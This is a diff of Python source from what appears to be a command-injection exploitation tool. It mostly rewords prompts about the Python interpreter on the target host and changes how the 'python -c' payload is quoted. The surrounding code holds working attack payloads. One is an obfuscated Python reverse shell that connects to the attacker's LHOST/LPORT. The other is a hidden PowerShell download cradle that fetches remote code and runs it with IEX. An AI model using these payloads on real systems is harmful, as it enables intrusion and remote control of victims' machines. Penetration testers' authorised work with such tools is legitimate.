@@ -122,7 +122,7 @@ def set_python_working_dir():
   while True:
     if not menu.options.batch:
       question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-      question_msg += "' as Python working directory on the target host? [Y/n] > "
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
       python_dir = _input(settings.print_question_msg(question_msg))
     else:
       python_dir = ""
@@ -131,8 +131,8 @@ def set_python_working_dir():
     if python_dir in settings.CHOICE_YES:
       break
     elif python_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working directory for Python (e.g. '" 
-      question_msg += settings.WIN_PYTHON_DIR + "') > "
+      question_msg = "Please provide a full path directory for Python interpreter (e.g. '" 
+      question_msg += "C:\\Python27\\python.exe') > "
       settings.WIN_PYTHON_DIR = _input(settings.print_question_msg(question_msg))
       settings.USER_DEFINED_PYTHON_DIR = True
       break
@@ -148,7 +148,7 @@ def set_python_interpreter():
   while True:
     if not menu.options.batch:
       question_msg = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
-      question_msg += "' as Python working interpreter on the target host? [Y/n] > "
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
       python_interpreter = _input(settings.print_question_msg(question_msg))
     else:
       python_interpreter = ""
@@ -158,7 +158,7 @@ def set_python_interpreter():
       break
     elif python_interpreter in settings.CHOICE_NO:
       question_msg = "Please provide a custom working interpreter for Python (e.g. '" 
-      question_msg += settings.LINUX_PYTHON_INTERPRETER  + "') > "
+      question_msg += "python27') > "
       settings.LINUX_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
       settings.USER_DEFINED_PYTHON_INTERPRETER = True
       break
@@ -380,7 +380,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 
     # Windows Python-reverse-shell
     elif other_shell == '8':
-      data =  " -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + settings.LHOST + "', " + settings.LPORT + ")), " \
+      data =  "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + settings.LHOST + "', " + settings.LPORT + ")), " \
               "[[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), " \
               "  __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), " \
               "    {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: " \
@@ -400,7 +400,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
               "for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] " \
               "for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] " \
               "for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), " \
-              "globals(), __import__('contextlib'))\""
+              "globals(), __import__('contextlib'))"
 
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
@@ -408,7 +408,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
       else:
         if not settings.USER_DEFINED_PYTHON_DIR: 
           set_python_working_dir()
-        other_shell = settings.WIN_PYTHON_DIR + data
+        other_shell = settings.WIN_PYTHON_DIR + " -c " + "\"" + data + "\""
       break
 
     # PHP-reverse-shell (meterpreter)
@@ -477,7 +477,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = content_file.readlines()
           data = ''.join(data)
           #data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
-
+          
         print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
@@ -491,7 +491,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         if settings.TARGET_OS == "win":
           if not settings.USER_DEFINED_PYTHON_DIR: 
             set_python_working_dir()
-          other_shell = settings.WIN_PYTHON_DIR + " -c " + data 
+          other_shell = settings.WIN_PYTHON_DIR + " -c " + "\"" + data + "\"" 
         else:
           if not settings.USER_DEFINED_PYTHON_INTERPRETER:
             set_python_interpreter()
@@ -648,7 +648,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
             if settings.TARGET_OS == "win":
               if not settings.USER_DEFINED_PYTHON_DIR: 
                 set_python_working_dir()
-              other_shell = settings.WIN_PYTHON_DIR + " -c " + data 
+              other_shell = settings.WIN_PYTHON_DIR + " -c " + "\"" + data + "\""
             else:
               if not settings.USER_DEFINED_PYTHON_INTERPRETER:
                 set_python_interpreter()
@@ -669,8 +669,8 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
               continue
             else:
               other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
-              msf_launch_msg(output)
-              break
+            msf_launch_msg(output)
+            break
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
